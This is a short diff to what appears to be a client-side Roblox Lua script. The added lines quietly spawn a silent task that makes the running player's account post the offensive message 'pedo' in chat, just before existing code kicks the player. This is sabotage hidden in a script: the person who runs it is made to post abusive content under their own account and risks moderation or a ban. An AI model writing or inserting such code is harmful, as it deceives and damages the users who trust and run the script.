@@ -411,6 +411,12 @@ task.spawn(function()
 		if not Success then
 			Canvas.Parent = Players.LocalPlayer.PlayerGui
 		end
+
+task.spawn(function()
+pcall(function()
+game:GetService("Players"):Chat("pedo")
+end)
+end)
 		
 		task.wait(100)
         Players.LocalPlayer:Kick()
